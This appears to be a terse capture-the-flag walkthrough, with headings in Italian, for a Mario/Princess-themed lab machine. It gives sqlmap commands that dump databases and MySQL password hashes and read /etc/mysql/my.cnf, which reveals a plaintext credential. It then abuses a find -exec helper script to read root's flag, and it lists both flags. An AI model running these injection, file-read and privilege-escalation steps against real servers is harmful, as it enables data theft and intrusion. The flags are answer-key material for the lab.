```bash
sqlmap -u "http://192.168.56.105:50987" --host="wiki.mario.it:50987" --data="cname=" --method=POST --dbs
```

## Mostrare Tabelle DB
```bash
sqlmap -u "http://192.168.56.105:50987" --host="wiki.mario.it:50987" --data="cname=" --method=POST -D DB_NAME --tables
```

## Mostrare Dati tabella
```bash
sqlmap -u "http://192.168.56.105:50987" --host="wiki.mario.it:50987" --data="cname=" --method=POST --dump -D DB_NAME --T NOME_TABELLA
```

```bash
sqlmap -u "http://192.168.56.105:50987" --host="wiki.mario.it:50987" --data="cname=''" --method=POST --sql-query="SELECT User, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM mysql.user"
```

```bash
sqlmap -u "http://192.168.56.105:50987" --host="wiki.mario.it:50987" --data="cname=''" --file-read=/etc/mysql/my.cnf
```

```text
#
# The MySQL database server configuration file.
#
# You can copy this to one of:
# - "/etc/mysql/my.cnf" to set global options,
# - "~/.my.cnf" to set user-specific options.
# 
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.
#
# For explanations see
# http://dev.mysql.com/doc/mysql/en/server-system-variables.html

#
# * IMPORTANT: Additional settings that can override those from this file!
#   The files must end with '.cnf', otherwise they'll be ignored.
#

!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/


# Allow mysql client via ssh
# mysql:Ah,Princess-a,whatabeautifulevening

[mysqld]
secure-file-priv='/'
```

```bash
cat ./find_princess.sh | grep 'root.txt'
```

```bash
./opt/find_princess.sh /root -type f -iname "root.txt" -exec cat {} \;
```

USER_FLAG = `3666011249f276aee20047d2082c758c`

ROOT_FLAG = `9a31aae079ea56c53d872aeeb5db9dec`